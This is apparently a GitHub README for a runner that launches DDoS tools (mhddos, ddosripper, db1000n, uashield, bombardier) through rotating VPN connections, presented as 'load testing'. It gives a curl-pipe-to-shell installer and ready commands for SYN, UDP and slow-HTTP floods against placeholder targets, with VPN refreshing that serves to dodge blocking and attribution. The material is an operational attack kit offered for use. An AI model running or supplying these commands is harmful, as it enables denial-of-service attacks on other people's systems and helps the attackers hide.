# Ubuntu load testing tools under vpn runner
Script runs load under vpn and refreshes vpn every N seconds

Supports many VPN providers via https://github.com/qdm12/gluetun/wiki

# Install
```
curl https://raw.githubusercontent.com/ctukraine22/runner/master/install.sh | sh
```

# Init vpn settings
```
/runner/init.sh %vpn-user% %vpn-pass% %vpn-type% "vpn-countries" %vpn-refresh-sec% %vpn-servers% %vpn-transport% %vpn-cret-repo%
# example:
 /runner/init.sh user1 code1 expressvpn Country
```

# Run

```
/runner/run.sh %tool% %tool-args%

/runner/run.sh bombardier -p "i,p,r" -c 1000 -d 9000s -l x.x.x.x 80 
/runner/run.sh ddosripper x.x.x.x 80 
/runner/run.sh mhddos SLOW http://x.x.x.x 5 100 socks5.txt 100 9000
/runner/run.sh mhddos SYN x.x.x.x:80 100 9000
bash /runner/run.sh mhddos UDP x.x.x.x:53 100 3000
/runner/run.sh db1000n
/runner/run.sh uashield

```
- %vpn-type% here https://github.com/qdm12/gluetun/wiki
- %vpn-transport%: tcp/udp
- "vpn-counties" %vpn-servers%: different fore each vpn provider, see https://github.com/qdm12/gluetun/wiki
- %vpn-cret-repo%: git repository which contains cert files in folder named same as %vpn-type%

To use cyberhost you need to provide repo with key and crt file via %vpn-cret-repo%

# Supported tools
- db1000n
- checksites
- gofucker
- uashield
- ddoser
- ddosripper
- bombardier
- mhddos
- kali

# Get status after reconnect
```
bash /runner/run.sh status
```